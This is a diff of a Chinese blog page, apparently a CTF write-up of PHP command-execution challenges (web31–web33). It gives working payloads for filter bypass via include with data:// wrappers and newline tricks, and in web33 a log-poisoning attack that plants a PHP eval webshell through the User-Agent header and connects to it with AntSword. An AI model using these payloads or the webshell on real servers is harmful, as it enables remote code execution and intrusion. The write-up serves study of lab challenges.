@@ -26,10 +26,14 @@
 <meta property="og:site_name" content="MaskObito">
 <meta property="og:description" content="命令执行常见函数：12345678system()    &#x2F;&#x2F; 执行外部程序并显示输出exec()      &#x2F;&#x2F; 执行外部程序passthru()  &#x2F;&#x2F; 执行外部程序并显示原始输出shell_exec() &#x2F;&#x2F; 通过shell执行命令&#96;&#96; &#96;&#96;(反引号)    &#x2F;&#x2F; 执行shell命令popen()     &#x2F;&#x2F; 打开进程文件指针proc_open() &#x2F;&#x2F; 执行命令并打开文件指针    常用">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/web33.png">
+<meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%911.png">
+<meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%912.png">
 <meta property="article:published_time" content="2025-06-09T15:00:01.000Z">
-<meta property="article:modified_time" content="2025-06-22T18:19:39.565Z">
+<meta property="article:modified_time" content="2025-07-04T10:35:13.493Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/web33.png">
   
   
   
@@ -226,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          912 字
+          1.5k 字
         
       </span>
     
@@ -237,7 +241,7 @@
         
         
         
-          8 分钟
+          13 分钟
         
       </span>
     
@@ -326,6 +330,7 @@
 
 <p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p>
 <p>} 结束else语句块</p>
+<p>尝试url&#x2F;?c&#x3D;system(‘ls’);（<strong>闭合标签<code>?&gt;</code></strong>：当PHP遇到<code>?&gt;</code>时，会<strong>自动在结尾插入分号</strong>（称为”隐含分号”），因此<code>system(&#39;ls&#39;)?&gt;</code>等价于<code>system(&#39;ls&#39;);</code>）</p>
 <p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p>
 <p>得到</p>
 <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>
@@ -351,8 +356,68 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p>
-<p>web31</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p>
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p>
+<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><em>if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;i”, $c)){</em> </p>
+<p>先尝试用?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;system(‘ls’);</p>
+<ul>
+<li>原始代码：<code>include$_GET[1]?&gt;</code><ul>
+<li><code>?&gt;</code> 是PHP的闭合标签，表示PHP代码结束。后续内容（<code>&amp;1=data://...</code>）会被视为普通文本（非PHP代码）。</li>
+</ul>
+</li>
+<li>若替换为<code>include$_GET[1];</code>：<ul>
+<li>分号<code>;</code>表示语句结束，但<strong>缺少空格</strong>导致语法错误。PHP会将<code>include$_GET[1]</code>视为一个未定义的常量（而非<code>include</code>关键字），从而报错。</li>
+</ul>
+</li>
+</ul>
+<p>payload：url&#x2F;?c&#x3D;include $_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls'); ?></p>
+<p>区别在于<code>1</code>参数的值：</p>
+<ul>
+<li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li>
+<li>成功案例：<code>data://</code>协议封装的数据流</li>
+</ul>
+<h4 id="include语句的工作机制"><a href="#include语句的工作机制" class="headerlink" title="include语句的工作机制"></a><strong><code>include</code>语句的工作机制</strong></h4><p>当执行 <code>include $_GET[1]</code> 时：</p>
+<ol>
+<li>PHP会尝试将 <code>$_GET[1]</code> 的值作为<strong>文件路径</strong>处理</li>
+<li>读取该路径的内容</li>
+<li>将内容当作PHP代码执行</li>
+</ol>
+<h4 id="失败案例解析"><a href="#失败案例解析" class="headerlink" title="失败案例解析"></a><strong>失败案例解析</strong></h4><p>payload1实际执行：<code>include &quot;system(&#39;ls&#39;);&quot;</code></p>
+<p>PHP行为：</p>
+<ol>
+<li>尝试打开名为 <code>system(&#39;ls&#39;);</code> 的文件</li>
+<li>文件系统不存在此文件 → 触发警告</li>
+<li>最终执行的是文件内容（空），而非代码</li>
+</ol>
+<p>payload2实际执行：<code>include &quot;data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;&quot;</code></p>
+<p>PHP行为：</p>
+<ol>
+<li>识别<code>data://</code>协议处理器</li>
+<li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li>
+<li><strong>执行其中的PHP代码</strong> → 运行<code>system(&#39;ls&#39;)</code></li>
+</ol>
+<p>绕过后的payload:url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system('ls'); ?></p>
+<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p>
+<p><img src="/images/web33.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li><p>url加上&#x2F;index.php(嫌麻烦可以跳过)</p>
+</li>
+<li><p>post传参a&#x3D;1(a不要与题目中参数一样)</p>
+</li>
+<li><p>抓包</p>
+</li>
+<li><p>UA头加上**<?php @eval($_POST['shell']); ?>**</p>
+</li>
+<li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>也可以用<strong>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>来绕过waf。</p>
+</li>
+<li><p>post参数改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>发包发现已经得到想要的结果。</p>
+<p><img src="/images/%E8%9A%81%E5%89%911.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/%E8%9A%81%E5%89%912.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
